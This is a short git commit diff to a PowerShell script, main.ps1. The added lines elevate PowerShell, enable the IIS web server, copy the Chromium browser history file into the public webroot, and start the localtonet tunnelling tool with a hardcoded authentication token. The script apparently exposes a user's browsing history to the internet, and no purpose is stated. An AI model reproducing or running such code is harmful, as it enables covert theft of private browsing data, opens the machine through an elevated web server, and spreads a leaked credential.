a91081c31e05fd830d86fabccf4c5ef58d4d0864
mehmetdere <105990633+mehmetdere@users.noreply.github.com>
2022-09-18 15:36:19 +0300

    v2.0.5

--- main.ps1
+++ main.ps1
@@ -1,1 +1,5 @@
- Copy-Item 'AppData\Local\Chromium\User Data\Default\History' 'C:\inetpub\wwwroot\History File.txt ' 
+start-process PowerShell -verb runas 
+DISM /online /enable-feature /featureName:IIS-DefaultDocument /All 
+ Copy-Item 'AppData\Local\Chromium\User Data\Default\History' 'C:\inetpub\wwwroot\History File ' 
+cd Downloads
+./localtonet authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI 
